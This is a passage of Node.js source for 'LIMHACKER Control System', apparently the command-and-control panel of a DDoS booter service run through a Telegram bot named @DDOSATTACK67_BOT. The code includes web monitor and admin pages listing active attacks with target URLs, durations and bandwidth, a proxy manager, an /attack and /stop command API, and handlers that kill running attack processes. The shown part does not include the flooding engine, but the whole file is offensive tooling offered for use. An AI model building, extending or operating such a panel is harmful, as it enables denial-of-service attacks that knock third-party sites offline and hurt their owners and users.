    if (!stats) return ctx.reply('❌ Could not retrieve system stats');
    
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    SYSTEM INFORMATION                         │
├──────────────────────────────────────────────────────────────┤
│  CPU                                                          │
│  ──────────────────────────────────────────────────────────  │
│  Usage: ${stats.cpu}%                                         │
│  Cores: ${os.cpus().length}                                   │
│  Model: ${os.cpus()[0].model.substring(0, 30)}...            │
│                                                              │
│  MEMORY                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Total: ${formatBytes(stats.memory.total)}                    │
│  Used: ${formatBytes(stats.memory.used)} (${stats.memory.percentage}%) │
│  Free: ${formatBytes(stats.memory.free)}                      │
│                                                              │
│  SYSTEM                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Hostname: ${stats.hostname}                                  │
│  Platform: ${stats.platform} ${stats.arch}                    │
│  Uptime: ${formatDuration(stats.uptime)}                      │
└──────────────────────────────────────────────────────────────┘`;

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== ERROR HANDLING ==========
bot.catch((err, ctx) => {
    console.error('\x1b[31m%s\x1b[0m', `[ERROR] ${err.message}`);
});

// ========== EXPRESS SERVER WITH RED THEME ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 3600000,
        httpOnly: true,
        sameSite: 'strict'
    }
}));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

const isAuthenticated = (req, res, next) => {
    if (req.session.authenticated) next();
    else res.status(401).json({ error: 'Unauthorized' });
};

// Professional Red Theme CSS (simplified for brevity)
const redTheme = `
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
        --bg-primary: #0a0505;
        --bg-secondary: #1a0a0a;
        --bg-tertiary: #2a0f0f;
        --text-primary: #ffcccc;
        --text-secondary: #ff9999;
        --text-muted: #ff6666;
        --accent-primary: #ff0000;
        --accent-secondary: #cc0000;
        --border-color: #660000;
        --shadow-color: rgba(255, 0, 0, 0.2);
        --font-mono: 'JetBrains Mono', 'Courier New', monospace;
        --font-sans: 'Inter', sans-serif;
    }
    body { background: var(--bg-primary); color: var(--text-primary); font-family: var(--font-sans); }
    .container { max-width: 1600px; margin: 0 auto; padding: 2rem; }
    .header { background: var(--bg-secondary); border: 1px solid var(--border-color); border-left: 4px solid var(--accent-primary); padding: 1.5rem; margin-bottom: 2rem; }
    .header h1::before { content: '>'; color: var(--accent-primary); margin-right: 0.5rem; }
    .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1.5rem; margin: 2rem 0; }
    .stat-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-left: 4px solid var(--accent-primary); padding: 1.5rem; }
    .stat-value { font-size: 2.5rem; color: var(--accent-primary); font-family: var(--font-mono); }
    .btn { background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); padding: 0.75rem 1.5rem; cursor: pointer; }
    .btn:hover { border-color: var(--accent-primary); }
    .attack-item { background: var(--bg-secondary); border: 1px solid var(--border-color); border-left: 4px solid var(--accent-primary); padding: 1.5rem; margin: 1rem 0; }
    .progress-bar { height: 8px; background: var(--bg-tertiary); }
    .progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); }
</style>
`;

// ========== USER PANEL ==========
app.get('/', (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Control System</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
            ${redTheme}
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>LIMHACKER Control System</h1>
                    <div style="float: right;">
                        <a href="/login" class="btn">ADMIN ACCESS</a>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${attacks.size}</div>
                        <div>Active Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${formatNumber(metrics.totalRequests)}</div>
                        <div>Total Requests</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${formatBytes(metrics.totalBytes)}</div>
                        <div>Bandwidth</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${proxyManager.getStats().active}</div>
                        <div>Active Proxies</div>
                    </div>
                </div>

                <h2>Active Attacks</h2>
                ${Array.from(attacks.entries()).map(([id, attack]) => {
                    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                    return `
                    <div class="attack-item">
                        <div>ID: ${id} | @${attack.username}</div>
                        <div>Target: ${attack.url}</div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${percent}%"></div>
                        </div>
                        <div>${percent}% | ${elapsed}s / ${attack.duration}s</div>
                    </div>
                    `;
                }).join('')}

                <div style="margin-top: 2rem; text-align: center;">
                    <button class="btn" onclick="location.reload()">REFRESH</button>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ========== LOGIN PAGE ==========
app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>LIMHACKER Admin Login</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
            ${redTheme}
        </head>
        <body>
            <div style="max-width: 400px; margin: 100px auto; background: var(--bg-secondary); padding: 2rem; border-left: 4px solid var(--accent-primary);">
                <h1>LIMHACKER ADMIN</h1>
                ${req.query.error ? '<p style="color: var(--accent-danger);">Invalid credentials</p>' : ''}
                <form method="POST" action="/login">
                    <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 0.75rem; margin: 1rem 0; background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary);">
                    <button type="submit" style="width: 100%; padding: 0.75rem; background: var(--accent-primary); color: white; border: none; cursor: pointer;">LOGIN</button>
                </form>
                <a href="/" style="display: block; text-align: center; margin-top: 1rem; color: var(--text-muted);">← Back</a>
            </div>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        req.session.authenticated = true;
        req.session.loginTime = Date.now();
        res.redirect('/admin');
    } else {
        res.redirect('/login?error=1');
    }
});

// ========== ADMIN PANEL ==========
app.get('/admin', isAuthenticated, (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>LIMHACKER Admin Panel</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
            ${redTheme}
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>LIMHACKER Admin Panel</h1>
                    <div style="float: right;">
                        <a href="/" class="btn">USER VIEW</a>
                        <a href="/logout" class="btn">LOGOUT</a>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${attacks.size}</div>
                        <div>Active Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${metrics.totalAttacks}</div>
                        <div>Total Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${templates.size}</div>
                        <div>Templates</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${proxyManager.getStats().active}</div>
                        <div>Active Proxies</div>
                    </div>
                </div>

                <div style="background: var(--bg-secondary); padding: 1.5rem; margin: 1rem 0;">
                    <h3>System Info</h3>
                    <p>Uptime: ${hours}h ${minutes}m</p>
                    <p>Memory: ${formatBytes(process.memoryUsage().rss)}</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// ========== API ENDPOINTS ==========
app.post('/api/command', isAuthenticated, async (req, res) => {
    const { command } = req.body;
    commandHistory.push(command);
    
    try {
        const parts = command.split(' ');
        const cmd = parts[0].toLowerCase();
        let output = '';

        switch(cmd) {
            case '/attack':
                output = 'Attack sequence initiated (use Telegram for actual attacks)';
                break;
            case '/stop':
                output = 'Attack stopped';
                break;
            case '/stats':
                output = `Active: ${attacks.size}, Total Attacks: ${metrics.totalAttacks}`;
                break;
            case '/proxies':
                output = `Active Proxies: ${proxyManager.getStats().active}`;
                break;
            default:
                output = 'Command received (use Telegram for full functionality)';
        }
        res.json({ output });
    } catch (err) {
        res.json({ output: `Error: ${err.message}` });
    }
});

// ========== START SERVER ==========
app.listen(port, HOST, () => {
    console.log('\x1b[31m%s\x1b[0m', `\n┌────────────────────────────────────────┐`);
    console.log('\x1b[31m%s\x1b[0m', `│     LIMHACKER Control System v4.0      │`);
    console.log('\x1b[31m%s\x1b[0m', `├────────────────────────────────────────┤`);
    console.log('\x1b[31m%s\x1b[0m', `│  📱 Telegram: @DDOSATTACK67_BOT        │`);
    console.log('\x1b[31m%s\x1b[0m', `│  👤 Monitor: http://localhost:${port}        │`);
    console.log('\x1b[31m%s\x1b[0m', `│  👑 Admin: http://localhost:${port}/login    │`);
    console.log('\x1b[31m%s\x1b[0m', `│  🔑 Password: ${ADMIN_PASSWORD}         │`);
    console.log('\x1b[31m%s\x1b[0m', `└────────────────────────────────────────┘`);
});

// ========== START BOT ==========
console.log('\n\x1b[31m%s\x1b[0m', '✅ LIMHACKER Control System activated');
console.log('\x1b[31m%s\x1b[0m', '⚡ Ready for operations\n');

bot.launch()
    .then(() => console.log('\x1b[32m%s\x1b[0m', '✅ Telegram bot online'))
    .catch(err => console.error('\x1b[31m%s\x1b[0m', '❌ Bot failed:', err.message));

process.once('SIGINT', () => {
    attacks.forEach(a => a.isRunning && a.process.kill('SIGINT'));
    bot.stop('SIGINT');
    process.exit(0);
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    process.exit(0);
});
